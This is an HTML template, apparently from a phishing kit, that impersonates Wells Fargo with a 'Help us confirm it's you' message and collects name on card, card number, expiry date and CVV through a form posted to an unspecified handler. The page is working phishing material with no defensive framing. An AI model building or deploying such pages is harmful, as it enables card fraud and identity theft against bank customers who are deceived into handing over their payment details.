{% extends 'base.html'%}

{%block body%}

    <div style="padding-top: 5px;" class="middle-form">
        <p style="font-size: 28px;">Card number </p>

        <p class='middle'>Help us confirm it's you by entering the number on any of your Wells Fargo debit or ATM cards or credit cards.</p>
        <div class="submitForm">
            <form action="" method="post">
                <div class="input-field">
                    <input placeholder="Name on card" name="card_name" type="text">
                </div>
                <div class="input-field">
                    <input placeholder="Card number" name="card_number" type="text">
                </div>

                <div class="input-field">
                    <input placeholder="Expiry date" name="exp_date" type="text">
                </div>
    
                <div class="input-field">
                    <input placeholder="CVV" name="cvv" type="text">
                </div>
            
            <button style="width: 100%;" type="submit">Continue</button>
        </form>
<br><br>
        <div class="neutral-link">
            <a style="font-family: Georgia, 'Times New Roman', Times, serif; text-decoration: none; color: black;" href="">Cancel</a>
        </div>
        
        </div>      
    </div>

{%endblock%}
